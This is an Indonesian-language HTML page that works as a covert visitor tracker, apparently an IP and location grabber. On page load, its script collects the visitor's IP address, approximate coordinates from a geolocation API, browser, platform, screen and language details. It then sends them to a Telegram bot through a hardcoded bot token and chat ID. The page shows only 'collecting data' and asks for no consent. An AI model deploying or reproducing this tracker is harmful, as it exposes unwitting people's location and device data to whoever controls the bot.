<!DOCTYPE html>
<html>
<head>
    <title>Pengumpulan Informasi Pengunjung</title>
</head>
<body>
    <h1>Sedang mengumpulkan data...</h1>
    <script>
        function sendDataToTelegram(data) {
            const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k'; // Ganti dengan token bot Anda
            const chatId = '7218964278';     // Ganti dengan chat ID Anda
            let message = "📊 **Informasi Pengunjung** 📊\n\n";
            for (const key in data) {
                message += `➡️ **${key}:** ${data[key]}\n`;
            }
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

            fetch(apiUrl)
                .then(response => response.json())
                .then(responseData => console.log('Pesan terkirim:', responseData))
                .catch(error => console.error('Gagal mengirim pesan:', error));
        }

        function getDeviceInfoAndSend() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const deviceInfo = {
                        "IP Address": data.ip,
                        "Lokasi (Perkiraan)": `Lintang ${data.latitude}, Bujur ${data.longitude}`,
                        "Browser": navigator.userAgent,
                        "Sistem Operasi": navigator.platform,
                        "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
                        "Kedalaman Warna": window.screen.colorDepth,
                        "Bahasa": navigator.language,
                        "Cookie Diaktifkan": navigator.cookieEnabled ? 'Ya ✅' : 'Tidak ❌'
                    };
                    sendDataToTelegram(deviceInfo);
                })
                .catch(error => {
                    console.error('Gagal mendapatkan informasi lokasi:', error);
                    // Tetap kirim informasi lain jika gagal mendapatkan lokasi
                    const deviceInfoWithoutLocation = {
                        "IP Address": 'Tidak Diketahui',
                        "Browser": navigator.userAgent,
                        "Sistem Operasi": navigator.platform,
                        "Resolusi Layar": `${window.screen.width}x${window.screen.height}`,
                        "Kedalaman Warna": window.screen.colorDepth,
                        "Bahasa": navigator.language,
                        "Cookie Diaktifkan": navigator.cookieEnabled ? 'Ya ✅' : 'Tidak ❌'
                    };
                    fetch('https://api.ipify.org?format=json')
                        .then(response => response.json())
                        .then(ipData => {
                            deviceInfoWithoutLocation["IP Address"] = ipData.ip;
                            sendDataToTelegram(deviceInfoWithoutLocation);
                        })
                        .catch(ipError => {
                            console.error('Gagal mendapatkan IP:', ipError);
                            sendDataToTelegram(deviceInfoWithoutLocation);
                        });
                });
        }

        // Panggil fungsi getDeviceInfoAndSend saat halaman dimuat
        window.onload = getDeviceInfoAndSend;
    </script>
</body>
</html>
